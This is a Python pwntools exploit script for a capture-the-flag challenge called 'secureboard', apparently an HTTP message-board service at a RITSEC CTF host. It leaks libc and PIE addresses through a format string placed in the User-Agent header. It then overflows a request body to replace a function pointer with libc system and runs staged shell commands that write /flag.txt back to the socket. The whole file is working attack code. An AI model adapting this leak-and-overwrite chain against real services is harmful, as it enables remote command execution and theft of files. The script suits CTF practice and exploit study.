#!/usr/bin/env python3
import re

from pwn import *

context.binary = elf = ELF("./secureboard", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = args.LOG_LEVEL or "info"

HOST = args.HOST or "careening.ctf.ritsec.club"
PORT = int(args.PORT or 1501)
TARGET_FILE = args.TARGET_FILE or "/flag.txt"

LEAK_FMT = b"%1$p|%2$p|%3$p"
PIE_LEAK_RET_OFFSET = 0x5874F
MSG_DATA_OFFSET = 0x60
MSG_STRIDE = 0x80
OVERFLOW_OFFSET_TO_LEN = 0x200
OVERFLOW_OFFSET_TO_METHOD = 0x208
OVERFLOW_OFFSET_TO_FN = 0x210
OVERFLOW_OFFSET_TO_ARENA = 0x218


def build_request(method: bytes, path: bytes, headers: dict[bytes, bytes], body: bytes = b"") -> bytes:
    lines = [method + b" " + path + b" HTTP/1.1", b"Host: pwn"]
    for key, value in headers.items():
        lines.append(key + b": " + value)
    if body:
        lines.append(b"Content-Length: " + str(len(body)).encode())
    lines.append(b"")
    lines.append(b"")
    return b"\r\n".join(lines) + body


def request_raw(payload: bytes) -> bytes:
    io = remote(HOST, PORT)
    io.send(payload)
    io.shutdown("send")
    data = io.recvall(timeout=2)
    io.close()
    return data


def leak_state() -> tuple[int, int, int]:
    payload = build_request(
        b"GET",
        b"/msg/0",
        {
            b"X-Debug": b"1",
            b"User-Agent": LEAK_FMT,
        },
    )
    response = request_raw(payload)
    header_blob = response.split(b"\r\n\r\n", 1)[0]

    debug_line = None
    for line in header_blob.split(b"\r\n"):
        if line.startswith(b"X-Debug-Info: "):
            debug_line = line.split(b": ", 1)[1]
            break

    if debug_line is None:
        log.failure(f"missing debug leak in response: {response!r}")
        raise SystemExit(1)

    atoll_leak_s, pie_leak_s, arena_leak_s = debug_line.split(b"|")
    atoll_leak = int(atoll_leak_s, 16)
    pie_leak = int(pie_leak_s, 16)
    arena_base = int(arena_leak_s, 16)

    libc.address = atoll_leak - libc.sym.atoll
    elf.address = pie_leak - PIE_LEAK_RET_OFFSET

    log.info(f"atoll@libc leak: {atoll_leak:#x}")
    log.info(f"PIE base:        {elf.address:#x}")
    log.info(f"libc base:       {libc.address:#x}")
    log.info(f"arena base:      {arena_base:#x}")

    return atoll_leak, elf.address, arena_base


def store_message(idx: int, data: bytes) -> bytes:
    if len(data) > 0x50:
        raise ValueError("message too large for arena slot")

    payload = build_request(
        b"POST",
        f"/msg/{idx}".encode(),
        {},
        data,
    )
    return request_raw(payload)


def trigger_system(command_ptr: int) -> bytes:
    body = flat(
        {
            OVERFLOW_OFFSET_TO_LEN: p64(0x50),
            OVERFLOW_OFFSET_TO_METHOD: p32(1) + p32(0),
            OVERFLOW_OFFSET_TO_FN: p64(libc.sym.system),
            OVERFLOW_OFFSET_TO_ARENA: p64(command_ptr),
        },
        filler=b"A",
        length=OVERFLOW_OFFSET_TO_ARENA + 8,
    )

    payload = build_request(
        b"POST",
        b"/msg/7",
        {},
        body,
    )
    return request_raw(payload)


def command_pointer(arena_base: int, msg_idx: int) -> int:
    return arena_base + msg_idx * MSG_STRIDE + MSG_DATA_OFFSET


def main() -> None:
    _, _, arena_base = leak_state()

    staged = []
    for msg_idx, fd in enumerate(range(4, 9)):
        cmd = f"sh -c 'cat {TARGET_FILE} >&{fd}'".encode()
        if len(cmd) > 0x50:
            raise ValueError(f"command too long for slot {msg_idx}: {cmd!r}")
        store_message(msg_idx, cmd)
        staged.append((msg_idx, fd, command_pointer(arena_base, msg_idx)))
        log.info(f"staged command for socket fd {fd} in slot {msg_idx}")

    for msg_idx, fd, cmd_ptr in staged:
        log.info(f"trying socket fd {fd} via command pointer {cmd_ptr:#x}")
        response = trigger_system(cmd_ptr)
        match = re.search(rb"RS\{[^}\r\n]+\}", response)
        if match:
            flag = match.group(0).decode()
            log.success(f"flag: {flag}")
            print(flag)
            return

    log.failure("flag not found; dumping last responses may help with manual triage")
    raise SystemExit(1)


if __name__ == "__main__":
    main()
